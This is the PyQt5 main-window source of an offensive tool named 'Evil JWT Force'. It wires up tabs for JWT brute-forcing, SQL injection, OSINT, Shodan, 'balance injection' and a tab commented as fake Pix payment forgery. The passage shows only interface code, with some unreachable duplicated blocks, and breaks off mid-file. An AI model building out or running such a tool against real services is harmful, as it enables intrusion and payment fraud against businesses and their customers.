import os, sys, logging
sys.path.insert(0, os.path.abspath(os.path.join(os.path.dirname(__file__), '..')))
from PyQt5.QtWidgets import (
    QApplication, QMainWindow, QTabWidget, QWidget, QVBoxLayout,
    QGroupBox, QFormLayout, QLineEdit, QPushButton, QHBoxLayout,
    QListWidget, QListWidgetItem, QCheckBox, QProgressBar, QLabel, QGridLayout, QTextEdit, QFileDialog, QComboBox, QDockWidget, QMessageBox, QScrollArea, QGraphicsDropShadowEffect, QFrame, QSpinBox, QDoubleSpinBox, QRadioButton, QButtonGroup, QStackedWidget, QTableWidget, QTableWidgetItem, QDialog, QInputDialog, QSizePolicy
)
from PyQt5.QtCore import Qt, QSize, QTimer, pyqtSignal, QSettings, QPoint, QDateTime, QThread, QObject
from PyQt5.QtGui import QPixmap, QPalette, QColor, QIcon, QFont, QMovie
import threading, json, webbrowser
import html
import subprocess, shutil
from ai_module.chat_manager import ChatManager
from ai_module.ai_worker import AIWorker
from ai_module.ai_feedback_engine import AIFeedbackEngine
from ai_module.realtime_event_bus import EventBus
import atexit
from modules.osint_module import OSINTScraper
from modules.osint_scraper import run_osint_scraping
from core.wordlist_generator import generate_wordlist, WordlistGenerator
from modules.token_bruteforce import TokenBruteforcer
from modules.fuzz_jwt import advanced_fuzz_token, JWTFuzzer
from core.sql_injector import SQLInjector
from modules.scan_target import TargetScanner
from core.report import generate_html_report
from core.jwt_bruteforce import run_jwt_bruteforce as backend_jwt_bruteforce
from core.sql_injector import run_sql_injection_jwt
from modules.crypto_utils import encrypt_aes, decrypt_aes, generate_iv, hash_sha256, hash_sha512, hash_md5, MODES
import base64
from hashlib import sha256
import requests
import time
from datetime import datetime
import jwt
from core.selenium_interceptor import SeleniumInterceptor
from core.interceptors.burp_api import BurpAPI
from modules.osint_module import OSINTScraper
from core.fake_pix_confirmer import FakePixConfirmer, build_payload, send_webhook, save_payload
from utils.network.network_manager import network_manager
try:
    import matplotlib
    matplotlib.use('Qt5Agg')
    from matplotlib.backends.backend_qt5agg import FigureCanvasQTAgg as FigureCanvas
    from matplotlib.figure import Figure
    HAS_MATPLOTLIB = True
except ImportError:
    HAS_MATPLOTLIB = False
import glob
from core.fuzzer import run_advanced_fuzzing
from utils.ai_connection_tester import test_ai_connection
from modules.voidsync_api import VoidSyncClient
from pathlib import Path
from config.settings import config
from modules.scan_engine import run_full_scan
import socket
import urllib.parse

# Handler to route Python logging into Qt widget
class QtLogHandler(logging.Handler):
    def __init__(self, widget):
        super().__init__()
        self.widget = widget
    def emit(self, record):
        msg = self.format(record)
        QTimer.singleShot(0, lambda: self.widget.append(msg))

# ChatBubble: reusable component for chat messages
class ChatBubble(QWidget):
    def __init__(self, sender, text, timestamp=None, is_user=False, parent=None, avatar_path=None, show_copy=True):
        super().__init__(parent)
        layout = QHBoxLayout(self)
        layout.setContentsMargins(0, 0, 0, 0)
        layout.setSpacing(8)

        # Avatar (left for AI, right for user)
        avatar_size = 38
        if avatar_path:
            avatar = QLabel()
            pix = QPixmap(avatar_path)
            avatar.setPixmap(pix.scaled(avatar_size, avatar_size, Qt.KeepAspectRatio, Qt.SmoothTransformation))
            avatar.setFixedSize(avatar_size, avatar_size)
        else:
            avatar = QLabel()
            avatar.setFixedSize(avatar_size, avatar_size)
            avatar.setStyleSheet(f"border-radius:{avatar_size//2}px; background: {'#0ff' if not is_user else '#ff00c8'}; border: 2px solid #222;")

        # Main message vertical layout
        msg_vbox = QVBoxLayout()
        msg_vbox.setContentsMargins(0, 0, 0, 0)
        msg_vbox.setSpacing(3)

        # Sender label
        sender_lbl = QLabel(sender)
        sender_lbl.setFont(QFont('Inter', 11, QFont.Bold))
        sender_lbl.setStyleSheet('color:#ffc107;' if not is_user else 'color:#fff;')
        msg_vbox.addWidget(sender_lbl, alignment=Qt.AlignRight if is_user else Qt.AlignLeft)

        # Bubble frame with neon/glassmorphism
        bubble = QFrame()
        bf_layout = QVBoxLayout(bubble)
        bf_layout.setContentsMargins(18, 12, 18, 12)
        bubble.setStyleSheet(f'''
            QFrame {{
                background: qlineargradient(x1:0, y1:0, x2:1, y2:1, stop:0 {'#232942' if not is_user else '#2a1a2e'}, stop:1 {'#1a1a2e' if not is_user else '#2a1a2e'});
                border-radius: 18px;
                border: 2px solid {'#0ff' if not is_user else '#ff00c8'};
                box-shadow: 0 0 18px {'#0ff6' if not is_user else '#ff00c866'};
                color: #eee;
            }}
        ''')

        # Message text (rich text)
        text_lbl = QLabel()
        text_lbl.setTextInteractionFlags(Qt.TextSelectableByMouse)
        text_lbl.setOpenExternalLinks(True)
        text_lbl.setWordWrap(True)
        text_lbl.setStyleSheet('color:#eee; font-family: JetBrains Mono, Segoe UI, Arial, sans-serif; font-size: 15px;')
        text_lbl.setText(self.format_chat_message(text))
        bf_layout.addWidget(text_lbl)

        # Copy-to-clipboard button
        if show_copy:
            from PyQt5.QtWidgets import QPushButton
            copy_btn = QPushButton('📋')
            copy_btn.setFixedSize(26, 26)
            copy_btn.setStyleSheet('''
                QPushButton {
                    border-radius: 13px;
                    background: rgba(30,255,255,0.12);
                    color: #0ff;
                    font-size: 15px;
                    border: 1px solid #0ff;
                }
                QPushButton:hover {
                    background: #0ff;
                    color: #222;
                }
            ''')
            def copy_text():
                clipboard = QApplication.clipboard()
                clipboard.setText(text)
            copy_btn.clicked.connect(copy_text)
            bf_layout.addWidget(copy_btn, alignment=Qt.AlignRight)

        # Neon shadow effect
        shadow = QGraphicsDropShadowEffect()
        shadow.setBlurRadius(24)
        shadow.setOffset(0, 4)
        shadow.setColor(QColor('#0ff' if not is_user else '#ff00c8'))
        bubble.setGraphicsEffect(shadow)

        msg_vbox.addWidget(bubble, alignment=Qt.AlignRight if is_user else Qt.AlignLeft)

        # Timestamp
        if timestamp is None:
            from PyQt5.QtCore import QDateTime
            timestamp = QDateTime.currentDateTime().toString('hh:mm')
        time_lbl = QLabel(timestamp)
        time_lbl.setFont(QFont('Inter', 8))
        time_lbl.setStyleSheet('color:#999;')
        msg_vbox.addWidget(time_lbl, alignment=Qt.AlignRight if is_user else Qt.AlignLeft)

        # Layout: [avatar][msg_vbox] or [msg_vbox][avatar]
        if is_user:
            layout.addStretch(1)
            layout.addLayout(msg_vbox)
            layout.addWidget(avatar)
        else:
            layout.addWidget(avatar)
            layout.addLayout(msg_vbox)
            layout.addStretch(1)

        self.setStyleSheet('background: transparent;')

    def format_chat_message(self, text):
        """
        Formata o texto do chat para HTML, suportando títulos, emojis, blocos de código, listas e destaques.
        """
        import re
        # Títulos: #, ##, ### → <h1>, <h2>, <h3>
        text = re.sub(r'^### (.*)$', r'<h3>\1</h3>', text, flags=re.MULTILINE)
        text = re.sub(r'^## (.*)$', r'<h2>\1</h2>', text, flags=re.MULTILINE)
        text = re.sub(r'^# (.*)$', r'<h1>\1</h1>', text, flags=re.MULTILINE)
        # Blocos de código markdown (```bash ...``` ou ```python ...``` ou ``` ... ```)
        def code_block(m):
            lang = m.group(1)
            code = m.group(2)
            return f'<pre style="background:#111;border-radius:8px;padding:8px 10px;margin:8px 0;color:#0ff;font-family:JetBrains Mono,monospace;font-size:13px;">{code}</pre>'
        text = re.sub(r'```(\w*)\n([\s\S]*?)```', code_block, text)
        # Inline code
        text = re.sub(r'`([^`]+)`', r'<span style="background:#222;border-radius:5px;padding:2px 6px;color:#0ff;font-family:JetBrains Mono,monospace;">\1</span>', text)
        # Bold, italic
        text = re.sub(r'\*\*([^*]+)\*\*', r'<b>\1</b>', text)
        text = re.sub(r'\*([^*]+)\*', r'<i>\1</i>', text)
        # Lists
        text = re.sub(r'^- (.*)$', r'• \1', text, flags=re.MULTILINE)
        # Emojis: já suportados pelo QLabel
        return text

        bubble = QFrame()
        bg = '#1abc9c' if is_user else '#3a3a3a'
        bubble.setStyleSheet(f"background-color:{bg}; border-radius:16px; border: 1.5px solid #444;")
        bf_layout = QVBoxLayout(bubble)
        bf_layout.setContentsMargins(18,12,18,12)
        # Message text (rich text)
        text_lbl = QLabel()
        text_lbl.setTextInteractionFlags(Qt.TextSelectableByMouse)
        text_lbl.setOpenExternalLinks(True)
        text_lbl.setWordWrap(True)
        text_lbl.setStyleSheet('color:#eee; font-family: Segoe UI, Arial, sans-serif; font-size: 15px; border:none; outline:none; background:transparent;')  # Sem borda, sem outline, fundo transparente
        text_lbl.setText(self.format_chat_message(text))
        bf_layout.addWidget(text_lbl)
        # Shadow effect
        shadow = QGraphicsDropShadowEffect()
        shadow.setBlurRadius(12)
        shadow.setOffset(0,3)
        bubble.setGraphicsEffect(shadow)
        layout.addWidget(bubble, alignment=Qt.AlignRight if is_user else Qt.AlignLeft)
        # Timestamp
        if timestamp is None:
            from PyQt5.QtCore import QDateTime
            timestamp = QDateTime.currentDateTime().toString('hh:mm')
        time_lbl = QLabel(timestamp)
        time_lbl.setFont(QFont('Segoe UI', 8))
        time_lbl.setStyleSheet('color:#999;')
        layout.addWidget(time_lbl, alignment=Qt.AlignRight if is_user else Qt.AlignLeft)

    def format_chat_message(self, text):
        """
        Formata o texto do chat para HTML, suportando títulos, emojis, blocos de código, listas e destaques.
        """
        import re
        # Títulos: #, ##, ### → <h1>, <h2>, <h3>
        text = re.sub(r'^### (.*)$', r'<h3>\1</h3>', text, flags=re.MULTILINE)
        text = re.sub(r'^## (.*)$', r'<h2>\1</h2>', text, flags=re.MULTILINE)
        text = re.sub(r'^# (.*)$', r'<h1>\1</h1>', text, flags=re.MULTILINE)
        # Blocos de código markdown (```bash ...``` ou ```python ...``` ou ``` ... ```)
        def code_block(m):
            lang = m.group(1)
            code = m.group(2)
            return f'<pre style="background:#222;padding:10px;font-family:Consolas,monospace;font-size:13px;color:#7ed957;margin:0;outline:none;border:none;">{code}</pre>'  # Sem borda, sem border-radius, sem outline
        text = re.sub(r'```(\w*)\n([\s\S]*?)```', code_block, text)
        # Inline code
        text = re.sub(r'`([^`]+)`', r'<span style="background:#222;padding:2px 6px;font-family:Consolas,monospace;color:#7ed957;border:none;outline:none;">\1</span>', text)
        # Listas
        text = re.sub(r'^\* (.*)$', r'<ul><li>\1</li></ul>', text, flags=re.MULTILINE)
        text = re.sub(r'^- (.*)$', r'<ul><li>\1</li></ul>', text, flags=re.MULTILINE)
        # Emojis (exemplo simples: :rocket: → 🚀)
        emoji_map = {':rocket:':'🚀', ':bulb:':'💡', ':lock:':'🔒', ':warning:':'⚠️', ':fire:':'🔥', ':bash:':'💻', ':python:':'🐍', ':star:':'⭐', ':check:':'✅', ':x:':'❌', ':info:':'ℹ️', ':key:':'🔑', ':bug:':'🐞', ':shield:':'🛡️', ':zap:':'⚡'}
        for k,v in emoji_map.items():
            text = text.replace(k, v)
        # Negrito e itálico
        text = re.sub(r'\*\*(.*?)\*\*', r'<b>\1</b>', text)
        text = re.sub(r'\*(.*?)\*', r'<i>\1</i>', text)
        # Links automáticos
        text = re.sub(r'(https?://[\w\./\-\?&=%#]+)', r'<a href="\1">\1</a>', text)
        # Exibe mensagem completa, sem truncamento
        return text
        # Bubble frame
        bubble = QFrame()
        # Dark theme bubbles: user accent, AI neutral dark
        bg = '#1abc9c' if is_user else '#3a3a3a'
        bubble.setStyleSheet(f"background-color:{bg}; border-radius:16px; border: 1.5px solid #444;")
        bf_layout = QVBoxLayout(bubble)
        bf_layout.setContentsMargins(18,12,18,12)
        # Message text (rich text)
        text_lbl = QLabel()
        text_lbl.setTextInteractionFlags(Qt.TextSelectableByMouse)
        text_lbl.setOpenExternalLinks(True)
        text_lbl.setWordWrap(True)
        text_lbl.setStyleSheet('color:#eee; font-family: Segoe UI, Arial, sans-serif; font-size: 15px;')
        # Render HTML (supports <b>, <i>, <h1-3>, <ul>, <ol>, <li>, <code>, <pre>, emojis)
        text_lbl.setText(self.format_chat_message(text))
        bf_layout.addWidget(text_lbl)
        # Shadow effect
        shadow = QGraphicsDropShadowEffect()
        shadow.setBlurRadius(12)
        shadow.setOffset(0,3)
        bubble.setGraphicsEffect(shadow)
        layout.addWidget(bubble, alignment=Qt.AlignRight if is_user else Qt.AlignLeft)
        # Timestamp
        if timestamp is None:
            timestamp = QDateTime.currentDateTime().toString('hh:mm')
        time_lbl = QLabel(timestamp)
        time_lbl.setFont(QFont('Segoe UI', 8))
        # Subtle light gray for timestamp
        time_lbl.setStyleSheet('color:#999;')
        layout.addWidget(time_lbl, alignment=Qt.AlignRight if is_user else Qt.AlignLeft)

class MainWindow(QMainWindow):
    # Signal for chat responses from worker thread
    chat_response = pyqtSignal(str)
    osint_log_signal = pyqtSignal(str)
    osint_progress_signal = pyqtSignal(int)
    # Signals for scan logs and progress
    scan_log_signal = pyqtSignal(str)
    scan_progress_signal = pyqtSignal(int)

    def ensure_floating_buttons_visible(self):
        # Garante que os botões flutuantes fiquem sempre no topo e visíveis
        self.chat_toggle_btn.raise_()
        self.chat_toggle_btn.show()
        self.chat_toggle_btn.move(self.width() - self.chat_toggle_btn.width() - 50, 50)
        if hasattr(self, 'vpn_log_btn'):
            self.vpn_log_btn.raise_()
            self.vpn_log_btn.show()
            x_chat = self.chat_toggle_btn.x()
            x_vpn = x_chat - self.vpn_log_btn.width() - 50
            self.vpn_log_btn.move(x_vpn, 50)

    def _save_feedback_history(self):
        try:
            self.feedback_engine.save_history(self.feedback_history_file)
        except Exception as e:
            print(f'[ERRO] Falha ao salvar histórico de feedback IA: {e}')

    def _filter_history(self, text):
        self._populate_history(filter_text=text)

    def _export_history(self):
        """Exporta o histórico de feedback IA para arquivo JSON escolhido pelo usuário."""
        file_name, _ = QFileDialog.getSaveFileName(self, 'Exportar Histórico', 'feedback_history.json', 'JSON Files (*.json)')
        if file_name:
            try:
                with open(file_name, 'w', encoding='utf-8') as f:
                    import json
                    json.dump(self.feedback_engine.get_history(), f, ensure_ascii=False, indent=2)
                QMessageBox.information(self, 'Exportação', 'Histórico exportado com sucesso!')
            except Exception as e:
                QMessageBox.critical(self, 'Erro', f'Erro ao exportar histórico:\n{str(e)}')

    def _populate_history(self, filter_text=None):
        """Popula o painel de histórico de feedback IA, opcionalmente filtrando."""
        self.history_list.clear()
        history = self.feedback_engine.get_history()
        if filter_text:
            filter_text = filter_text.lower()
            filtered = []
            for entry in history:
                # Busca em texto, tipo, módulo, sugestão/alerta
                import json
                text_blob = json.dumps(entry, ensure_ascii=False).lower()
                if filter_text in text_blob:
                    filtered.append(entry)
            history = filtered
        for entry in history:
            tipo = entry.get('type', 'feedback').capitalize()
            modulo = entry.get('module', 'Desconhecido')
            mensagem = entry.get('message', '')
            ts = entry.get('timestamp', '')
            item_text = f"[{tipo}] [{modulo}] {mensagem} ({ts})"
            from PyQt5.QtGui import QColor
            from PyQt5.QtWidgets import QListWidgetItem
            item = QListWidgetItem(item_text)
            if tipo == 'Sugestão':
                item.setForeground(QColor('#1abc9c'))
            elif tipo == 'Alerta':
                item.setForeground(QColor('#e67e22'))
            self.history_list.addItem(item)

    def _on_attack_result_gui(self, event):
        """Callback: recebe eventos de módulos, processa e atualiza painel de feedback IA em tempo real."""
        feedback = self.feedback_engine.process_event(event)
        self._populate_history()
        # (Opcional) popup para alertas críticos
        if feedback.get('alerts'):
            QMessageBox.warning(self, 'Alerta de Segurança', '\n'.join(feedback['alerts']))

    def __init__(self):
        super().__init__()
        self.setWindowTitle('Evil JWT Force - PyQt')
        # Set application icon
        self.setWindowIcon(QIcon(os.path.join(os.path.dirname(__file__), 'assets', 'icon.ico')))
        # Aumenta a resolução padrão para garantir visibilidade dos botões em telas grandes
        # Aumenta a resolução inicial para garantir espaço amplo para abas e botões
        self.resize(1920, 1200)
        # --- Floating Chat button (always on top) ---
        self.chat_toggle_btn = QPushButton('🧠 Chat IA', self)
        self.chat_toggle_btn.setToolTip('Abrir painel de chat IA')
        self.chat_toggle_btn.setFixedSize(140, 60)
        self.chat_toggle_btn.setStyleSheet('QPushButton { z-index: 9999; background: #1abc9c; color: #fff; font-weight: bold; border-radius: 12px; border: 2px solid #16a085; }')
        self.chat_toggle_btn.move(self.width() - self.chat_toggle_btn.width() - 50, 50)
        self.chat_toggle_btn.show()
        self.chat_toggle_btn.raise_()
        self.chat_toggle_btn.clicked.connect(self.toggle_chat_panel)
        # --- Painel de Chat (ChatDock) ---
        self.chat_dock = QDockWidget('Chat com IA', self)
        self.chat_dock.setAllowedAreas(Qt.LeftDockWidgetArea | Qt.RightDockWidgetArea)
        self.chat_dock.setFeatures(QDockWidget.DockWidgetClosable | QDockWidget.DockWidgetMovable | QDockWidget.DockWidgetFloatable)
        self.chat_widget = QWidget()
        self.chat_widget.setStyleSheet("background-color: #2b2b2b; color: #eee;")
        dock_layout = QVBoxLayout(self.chat_widget)
        dock_layout.setContentsMargins(16,16,16,16)
        dock_layout.setSpacing(16)
        self.chat_scroll = QScrollArea()
        self.chat_scroll.setWidgetResizable(True)
        self.chat_scroll.setHorizontalScrollBarPolicy(Qt.ScrollBarAlwaysOff)
        self.chat_content = QWidget()
        self.chat_content_layout = QVBoxLayout(self.chat_content)
        self.chat_content_layout.setContentsMargins(0,0,0,0)
        self.chat_content_layout.setSpacing(10)
        self.chat_scroll.setWidget(self.chat_content)
        dock_layout.addWidget(self.chat_scroll)
        welcome = ChatBubble('Agent AI', 'Olá! Em que posso ajudá-lo hoje?', is_user=False)
        self.chat_content_layout.addWidget(welcome, alignment=Qt.AlignLeft)
        self.chat_scroll.verticalScrollBar().setValue(self.chat_scroll.verticalScrollBar().maximum())
        self.chat_status_label = QLabel('')
        dock_layout.addWidget(self.chat_status_label)
        chat_input_layout = QHBoxLayout()
        self.chat_input_dialog = QLineEdit()
        self.chat_input_dialog.setStyleSheet(
            "background-color: #3a3a3a; color: #eee; border: 1px solid #555; border-radius: 8px; padding: 8px;"
        )
        self.chat_input_dialog.setPlaceholderText('Digite sua mensagem...')
        self.chat_input_dialog.returnPressed.connect(self.send_chat_message_dialog)
        chat_input_layout.addWidget(self.chat_input_dialog)
        send_btn = QPushButton('🧠 Enviar')
        send_btn.clicked.connect(self.send_chat_message_dialog)
        chat_input_layout.addWidget(send_btn)
        clear_btn = QPushButton('Limpar Conversa')
        clear_btn.clicked.connect(self.clear_chat_history)
        chat_input_layout.addWidget(clear_btn)
        dock_layout.addLayout(chat_input_layout)
        self.chat_dock.setWidget(self.chat_widget)
        self.addDockWidget(Qt.RightDockWidgetArea, self.chat_dock)
        self.chat_dock.hide()
        # --- Botão VPN Logs (ao lado do Chat IA) ---
        self.vpn_log_btn = QPushButton('🌐 VPN Logs', self)
        self.vpn_log_btn.setToolTip('Ver logs da VPN e status de conexão')
        self.vpn_log_btn.setFixedSize(140, 60)
        self.vpn_log_btn.show()
        self.vpn_log_btn.raise_()
        self.vpn_log_btn.clicked.connect(self.open_vpn_logs_dialog)
        # --- INTEGRAÇÃO FEEDBACK ENGINE E HISTÓRICO ---
        self.feedback_engine = AIFeedbackEngine()
        self.feedback_history_file = os.path.join(os.path.dirname(__file__), '../output/feedback_history.json')
        self.feedback_engine.load_history(self.feedback_history_file)
        # --- EVENT BUS para integração dinâmica ---
        self.event_bus = EventBus()
        self.event_bus.subscribe('attack_result', self._on_attack_result_gui)
        self.event_bus.start()
        # Salvar histórico ao fechar
        atexit.register(self._save_feedback_history)
        # --- FIM INTEGRAÇÃO FEEDBACK ENGINE ---
        # Load saved API keys from persistent settings
        settings = QSettings('EvilJWTForce', 'Settings')
        openai_key = settings.value('openai_api_key', '') or ''
        # Load Shodan API key
        shodan_key = settings.value('shodan_api_key', '') or ''
        # Persiste chave Shodan na instância para uso futuro
        self.shodan_api_key = shodan_key
        if openai_key:
            os.environ['OPENAI_API_KEY'] = openai_key
        if shodan_key:
            os.environ['SHODAN_API_KEY'] = shodan_key
        # Initialize ChatManager
        self.chat_manager = ChatManager()
        if openai_key:
            self.chat_manager.set_openai_api_key(openai_key)
        # Connect chat response signal to UI update slot
        self.chat_response.connect(self._finish_chat)
        # Initialize background AI worker for automatic suggestions
        self.ai_worker = AIWorker(openai_key=openai_key or None)
        self.ai_worker.suggestion_ready.connect(self._handle_suggestion)
        # Exibe sugestões do AI diretamente no chat
        self.ai_worker.suggestion_ready.connect(self.add_ai_suggestion_to_chat)
        # Exibe sugestões do AI diretamente no chat
        self.ai_worker.suggestion_ready.connect(self.add_ai_suggestion_to_chat)
        # Eventos para abortar tarefas
        self._scan_abort = threading.Event()
        self._osint_abort = threading.Event()
        self._fuzz_abort = threading.Event()
        self._manual_abort = threading.Event()
        # Abort events for other tasks
        self._jwt_brute_abort = threading.Event()
        self._jwt_sqli_abort = threading.Event()
        self._crypto_abort = threading.Event()
        self._wordlist_abort = threading.Event()
        self._balance_abort = threading.Event()
        self._sqli_abort = threading.Event()
        self._pipeline_abort = threading.Event()
        # Layout with logo and tabs
        central_widget = QWidget()
        # Dark background for main content
        central_widget.setStyleSheet('background-color: #2b2b2b;')
        central_layout = QVBoxLayout(central_widget)
        # --- HEADER FIXO PARA LOGO E BOTÕES ---
        header_widget = QWidget()
        header_widget.setFixedHeight(120)
        header_layout = QHBoxLayout(header_widget)
        header_layout.setContentsMargins(30, 10, 30, 10)
        header_layout.setSpacing(10)
        # Espaço à esquerda
        header_layout.addStretch(1)
        # Logo centralizado
        logo_label = QLabel()
        logo_pixmap = QPixmap(os.path.join(os.path.dirname(__file__), 'assets', 'logo1.png'))
        logo_label.setPixmap(logo_pixmap.scaledToWidth(380, Qt.SmoothTransformation))
        logo_label.setAlignment(Qt.AlignCenter)
        header_layout.addWidget(logo_label, alignment=Qt.AlignCenter)
        # Espaço à direita
        header_layout.addStretch(1)
        central_layout.addWidget(header_widget)
        # --- FIM HEADER ---
        self.tabs = QTabWidget()
        # Dark background for tab pages
        self.tabs.setStyleSheet('QTabWidget::pane { background-color: #2b2b2b; }')
        # Diminui altura ocupada pelas abas, deixando espaço para header
        self.tabs.setSizePolicy(QSizePolicy.Expanding, QSizePolicy.Expanding)
        central_layout.addWidget(self.tabs)
        # --- PAINEL DE HISTÓRICO DE FEEDBACK ---
        self.history_tab = QWidget()
        self.history_layout = QVBoxLayout(self.history_tab)
        self.history_filter_box = QLineEdit()
        self.history_filter_box.setPlaceholderText('Filtrar histórico por palavra-chave, sugestão, alerta ou módulo...')
        self.history_filter_box.textChanged.connect(self._filter_history)
        self.history_layout.addWidget(self.history_filter_box)
        self.history_list = QListWidget()
        self.history_layout.addWidget(self.history_list)
        self.export_history_btn = QPushButton('Exportar Histórico')
        self.export_history_btn.clicked.connect(self._export_history)
        self.history_layout.addWidget(self.export_history_btn)
        self.tabs.addTab(self.history_tab, 'Histórico Feedback IA')
        self._populate_history()
        # --- FIM PAINEL DE HISTÓRICO ---
        # Footer logos (logo2 below tabs, logo3 below logo2)
        logo2_label = QLabel()
        logo2_pixmap = QPixmap(os.path.join(os.path.dirname(__file__), 'assets', 'logo2.png'))
        # Increase footer logo sizes
        logo2_label.setPixmap(logo2_pixmap.scaledToWidth(200, Qt.SmoothTransformation))
        logo2_label.setAlignment(Qt.AlignCenter)
        central_layout.addWidget(logo2_label)

        logo3_label = QLabel()
        logo3_pixmap = QPixmap(os.path.join(os.path.dirname(__file__), 'assets', 'logo3.png'))
        logo3_label.setPixmap(logo3_pixmap.scaledToWidth(200, Qt.SmoothTransformation))
        logo3_label.setAlignment(Qt.AlignCenter)
        central_layout.addWidget(logo3_label)
        self.setCentralWidget(central_widget)
        self.ensure_floating_buttons_visible()
        # Setup tabs (original ordering)
        self.setup_dashboard_tab()
        self.setup_osint_tab()
        # Banco de Dados com API VoidSync
        self.setup_database_tab()
        # Add Shodan tab for Shodan queries
        self.setup_shodan_tab()
        # Setup Fake Pix payment forgery tab
        self.setup_fake_pix_tab()
        self.setup_jwt_tab()
        self.setup_crypto_tab()
        self.setup_wordlist_tab()
        self.setup_target_scan_tab()
        self.setup_balance_injection_tab()
        self.setup_manual_attack_tab()
        self.setup_fuzzing_tab()
        self.setup_sql_tab()
        self.setup_pipeline_tab()
        self.setup_reports_tab()
        # Configuration tab moved to the end
        self.setup_settings_tab()
        # --- MÉTODO PADRÃO PARA EXECUTAR MÓDULOS DE ATAQUE PELA GUI ---
    def run_attack_module(self, module_instance):
        """Executa um módulo de ataque em thread, garantindo integração com o event_bus da interface."""
        import threading
        t = threading.Thread(target=module_instance.run, args=(self.event_bus,), daemon=True)
        t.start()
        return t
        # --- FIM MÉTODO PADRÃO ---
        # Create chat panel as dockable widget
        self.chat_dock = QDockWidget('Chat com IA', self)
        self.chat_dock.setAllowedAreas(Qt.LeftDockWidgetArea | Qt.RightDockWidgetArea)
        self.chat_dock.setFeatures(QDockWidget.DockWidgetClosable | QDockWidget.DockWidgetMovable | QDockWidget.DockWidgetFloatable)
        self.chat_widget = QWidget()
        self.chat_widget.setStyleSheet("background-color: #2b2b2b; color: #eee;")
        dock_layout = QVBoxLayout(self.chat_widget)
        dock_layout.setContentsMargins(16,16,16,16)
        dock_layout.setSpacing(16)
        self.chat_scroll = QScrollArea()
        self.chat_scroll.setWidgetResizable(True)
        self.chat_scroll.setHorizontalScrollBarPolicy(Qt.ScrollBarAlwaysOff)
        self.chat_content = QWidget()
        self.chat_content_layout = QVBoxLayout(self.chat_content)
        self.chat_content_layout.setContentsMargins(0,0,0,0)
        self.chat_content_layout.setSpacing(10)
        self.chat_scroll.setWidget(self.chat_content)
        dock_layout.addWidget(self.chat_scroll)
        welcome = ChatBubble('Agent AI', 'Olá! Em que posso ajudá-lo hoje?', is_user=False)
        self.chat_content_layout.addWidget(welcome, alignment=Qt.AlignLeft)
        self.chat_scroll.verticalScrollBar().setValue(self.chat_scroll.verticalScrollBar().maximum())
        self.chat_status_label = QLabel('')
        dock_layout.addWidget(self.chat_status_label)
        chat_input_layout = QHBoxLayout()
        self.chat_input_dialog = QLineEdit()
        self.chat_input_dialog.setStyleSheet(
            "background-color: #3a3a3a; color: #eee; border: 1px solid #555; border-radius: 8px; padding: 8px;"
        )
        self.chat_input_dialog.setPlaceholderText('Digite sua mensagem...')
        self.chat_input_dialog.returnPressed.connect(self.send_chat_message_dialog)
        chat_input_layout.addWidget(self.chat_input_dialog)
        send_btn = QPushButton('🧠 Enviar')
        send_btn.clicked.connect(self.send_chat_message_dialog)
        chat_input_layout.addWidget(send_btn)
        clear_btn = QPushButton('Limpar Conversa')
        clear_btn.clicked.connect(self.clear_chat_history)
        chat_input_layout.addWidget(clear_btn)
        dock_layout.addLayout(chat_input_layout)
        self.chat_dock.setWidget(self.chat_widget)
        self.addDockWidget(Qt.RightDockWidgetArea, self.chat_dock)
        self.chat_dock.hide()
        # Button to open VPN logs dialog next to Chat IA
        self.vpn_log_btn = QPushButton('🌐 VPN Logs', self)
        self.vpn_log_btn.setToolTip('Ver logs da VPN e status de conexão')
        self.vpn_log_btn.setFixedSize(140, 60)
        self.vpn_log_btn.show()
        self.vpn_log_btn.raise_()
        self.vpn_log_btn.clicked.connect(self.open_vpn_logs_dialog)

    def setup_dashboard_tab(self):
        """Setup the Dashboard tab with log console and control buttons"""
        dash_tab = QWidget()
        # Main horizontal layout
        layout = QHBoxLayout(dash_tab)
        layout.setContentsMargins(10, 10, 10, 10)
        layout.setSpacing(10)
        # Left panel: counter banners and control buttons
        btn_panel = QVBoxLayout()
        btn_panel.setSpacing(5)
        # Chat model selector
        model_layout = QHBoxLayout()
        model_label = QLabel('Modelo de Chat:')
        model_layout.addWidget(model_label)
        self.model_combo = QComboBox()
        self.model_combo.addItems(['gpt-3.5-turbo', 'gpt-4'])
        self.model_combo.setCurrentText(self.chat_manager.model)
        self.model_combo.currentTextChanged.connect(lambda m: setattr(self.chat_manager, 'model', m) or os.environ.__setitem__('OPENAI_MODEL', m))
        model_layout.addWidget(self.model_combo)
        btn_panel.addLayout(model_layout)
        # Initialize counters
        self.tokens_count = 0
        self.targets_count = 0
        self.injections_count = 0
        # Counter banners
        def make_banner(title, label_attr):
            box = QGroupBox(title)
            box_layout = QVBoxLayout(box)
            count_label = QLabel('0')
            count_label.setAlignment(Qt.AlignCenter)
            count_label.setFont(QFont('Arial', 16, QFont.Bold))
            box_layout.addWidget(count_label)
            setattr(self, label_attr, count_label)
            return box
        btn_panel.addWidget(make_banner('Tokens analisados', 'token_count_label'))
        btn_panel.addWidget(make_banner('Alvos Escaneados', 'targets_count_label'))
        btn_panel.addWidget(make_banner('Injeções Realizadas', 'injections_count_label'))
        # Control buttons
        save_btn = QPushButton('Salvar Log')
        save_btn.setToolTip('Salva o log atual em arquivo')
        save_btn.clicked.connect(self.save_dashboard_log)
        clear_btn = QPushButton('Limpar Log')
        clear_btn.setToolTip('Limpa o console de log')
        clear_btn.clicked.connect(self.clear_dashboard_log)
        export_btn = QPushButton('Exportar Relatório')
        export_btn.setToolTip('Gera um relatório HTML')
        export_btn.clicked.connect(self.generate_report)
        btn_panel.addWidget(save_btn)
        btn_panel.addWidget(clear_btn)
        btn_panel.addWidget(export_btn)
        btn_panel.addStretch()
        layout.addLayout(btn_panel)
        # Right panel: log area
        right_layout = QVBoxLayout()
        right_layout.setSpacing(5)
        label = QLabel('Console Log')
        right_layout.addWidget(label)
        self.dashboard_console = QTextEdit()
        self.dashboard_console.setReadOnly(True)
        right_layout.addWidget(self.dashboard_console)
        layout.addLayout(right_layout)
        self.tabs.addTab(dash_tab, 'Dashboard')
        # Hook Python logging to dashboard console
        handler = QtLogHandler(self.dashboard_console)
        handler.setLevel(logging.INFO)
        handler.setFormatter(logging.Formatter('[%(asctime)s] %(message)s', '%H:%M:%S'))
        # Ensure INFO-level logs are captured
        logger = logging.getLogger()
        logger.setLevel(logging.INFO)
        logger.addHandler(handler)
        # Initial logs
        logging.info('Bem-vindo ao Evil JWT Force')
        logging.info('Inicializando ChatManager...')

    def clear_dashboard_log(self):
        """Clear dashboard log console"""
        self.dashboard_console.clear()
    def inc_tokens_count(self):
